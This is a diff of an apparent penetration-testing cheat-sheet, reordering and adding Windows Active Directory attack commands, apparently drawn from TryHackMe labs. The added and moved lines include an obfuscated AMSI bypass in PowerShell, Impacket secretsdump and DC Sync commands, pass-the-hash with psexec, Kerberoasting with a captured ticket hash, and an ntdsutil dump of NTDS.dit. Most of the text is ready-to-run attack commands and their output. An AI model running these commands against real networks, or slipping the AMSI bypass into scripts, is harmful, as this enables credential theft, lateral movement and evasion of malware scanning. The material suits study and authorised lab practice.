@@ -14,7 +14,107 @@
 docker run --rm -it --mount type=bind,source="$HOME/.theHarvester/api-keys.yaml",target="/app/api-keys.yaml" --entrypoint "/root/.local/bin/theHarvester" theharvester -d linkedin.com -b all
 ```  
 -d : target domain
--b: data source
+-b: data source  
+
+// h8mail  
+```  
+h8mail -t emails.txt
+```
+
+// Impacket - Docker install
+```
+git clone https://github.com/fortra/impacket.git
+cd impacket
+docker build -t "impacket:latest" .
+```
+
+// Impacket - Run docker container with binded share folder from local desktop
+```  
+docker run -it --rm -v ~/Desktop/share:/shared impacket:latest
+```  
+
+// AMSI bypass - https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/  
+```
+$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
+$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
+$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
+$field.SetValue($null,$true)
+```
+
+// Impacket - Create share  (not MacOS)
+```  
+smbserver.py -smb2support -username <user> -password <password> public share
+```
+
+// Impacket/Linux - Set perms on shared files
+```  
+chmod +r ~/Desktop/share/sam.hive
+chmod +r ~/Desktop/share/system.hive   
+```  
+
+// Impacket - Secrets Dump
+```  
+secretsdump.py -sam sam.hive -system system.hive LOCAL
+```  
+
+// Impacket - Pass the hash  
+```  
+psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a8
+4d07b0e3b34f5::: administrator@x.x.x.x
+```  
+
+// Impacket - extract hashes from ntds files
+```
+secretsdump.py -security ~/SECURITY -system ~/SYSTEM -ntds ~/ntds.dit local
+```
+// Impacket - DC Sync attack just NTDS data
+```
+secretsdump.py -just-dc THM.red/<AD_Admin_User>@x.x.x.x
+```
+
+// Impacket - DC Sync Just NTLM data
+```
+secretsdump.py -just-dc-ntlm THM.red/<AD_Admin_User>@x.x.x.x
+```
+
+// Impacket - Enumerate SPN users
+```
+GetUserSPNs.py -dc-ip 10.10.117.9 THM.red/thm
+Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
+
+Password:
+ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
+----------------------------  -------  --------  --------------------------  ---------  ----------
+http/creds-harvestin.thm.red  svc-thm            2022-06-10 10:47:33.796826  <never> 
+```
+
+// Impacket - Request TGS Ticket as SPN account
+```
+GetUserSPNs.py -dc-ip 10.10.117.9 THM.red/thm -request-user svc-thm
+Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
+
+Password:
+ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
+----------------------------  -------  --------  --------------------------  ---------  ----------
+http/creds-harvestin.thm.red  svc-thm            2022-06-10 10:47:33.796826  <never>               
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*svc-thm$THM.RED$THM.red/svc-thm*$...
+
+```
+
+// Ntdsutil - Dump NTDS.dit
+```powershell
+powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+```
+creates 3 files
+```
+- C:\Windows\NTDS\ntds.dit
+- C:\Windows\System32\config\SYSTEM
+- C:\Windows\System32\config\SECURITY
+```
 
 // Payloads with msfvenom - Linux
 ```
@@ -96,97 +196,6 @@ mimikatz # sekurlsa::logonpasswords
 ...
 mimikatz # sekurlsa::credman
 ...
-```
-
-// h8mail  
-```  
-h8mail -t emails.txt
-```
-// Install
-```
-git clone https://github.com/fortra/impacket.git
-cd impacket
-docker build -t "impacket:latest" .
-```
-
-// Impacket - Run docker container with binded share folder from local desktop
-```  
-docker run -it --rm -v ~/Desktop/share:/shared impacket:latest
-
-```  
-
-// Linux - Set perms on shared files
-```  
-chmod +r ~/Desktop/share/sam.hive
-chmod +r ~/Desktop/share/system.hive   
-```  
-
-// Impacket - Create share  (not MacOS)
-```  
-smbserver.py -smb2support -username <user> -password <password> public share
-```  
-
-// Impacket - Secrets Dump
-```  
-secretsdump.py -sam sam.hive -system system.hive LOCAL
-```  
-
-// Impacket - Pass the hash  
-```  
-psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a8
-4d07b0e3b34f5::: administrator@x.x.x.x
-```  
-// Ntdsutil - Dump NTDS.dit
-```powershell
-powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
-```
-creates 3 files
-```
-- C:\Windows\NTDS\ntds.dit
-- C:\Windows\System32\config\SYSTEM
-- C:\Windows\System32\config\SECURITY
-```
-
-// Impacket - extract hashes from ntds files
-```
-secretsdump.py -security ~/SECURITY -system ~/SYSTEM -ntds ~/ntds.dit local
-```
-// Impacket - DC Sync attack just NTDS data
-```
-secretsdump.py -just-dc THM.red/<AD_Admin_User>@x.x.x.x
-```
-
-// Impacket - DC Sync Just NTLM data
-```
-secretsdump.py -just-dc-ntlm THM.red/<AD_Admin_User>@x.x.x.x
-```
-
-// Impacket - Enumerate SPN users
-```
-GetUserSPNs.py -dc-ip 10.10.117.9 THM.red/thm
-Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
-
-Password:
-ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
-----------------------------  -------  --------  --------------------------  ---------  ----------
-http/creds-harvestin.thm.red  svc-thm            2022-06-10 10:47:33.796826  <never> 
-```
-
-// Impacket - Request TGS Ticket as SPN account
-```
-GetUserSPNs.py -dc-ip 10.10.117.9 THM.red/thm -request-user svc-thm
-Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
-
-Password:
-ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
-----------------------------  -------  --------  --------------------------  ---------  ----------
-http/creds-harvestin.thm.red  svc-thm            2022-06-10 10:47:33.796826  <never>               
-
-
-
-[-] CCache file is not found. Skipping...
-$krb5tgs$23$*svc-thm$THM.RED$THM.red/svc-thm*$...
-
 ```
 
 // Performing an AS-REP Roasting Attack against Users List
